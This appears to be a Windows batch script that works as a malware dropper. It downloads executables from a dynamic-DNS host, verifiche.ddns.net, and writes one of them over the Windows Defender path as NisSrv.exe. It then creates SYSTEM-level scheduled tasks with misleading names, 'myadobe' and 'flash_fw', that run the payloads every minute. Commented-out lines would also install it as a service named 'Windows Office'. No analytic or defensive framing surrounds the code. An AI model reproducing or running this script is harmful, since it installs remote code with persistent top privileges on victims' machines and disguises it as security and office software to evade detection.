rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/wofficeie1.exe','%windir%\wofficeie1.exe')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/cacert.pem','%windir%\cacert.pem')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/woffice.exe','%windir%\woffice.exe')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
rem %windir%\wofficeie1.exe
SLEEP 10
rem taskkill /f /im wup.exe
rem copy /y %windir%\wofficeie1.exe %windir%\wup.exe
rem sc create wup binPath= "%windir%\wup.exe" DisplayName= "Windows Office" start= auto
rem net start wup
schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice.exe" /tn myadobe /rl highest /F
schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Defender\NisSrv.exe" /tn flash_fw /rl highest /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 3 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
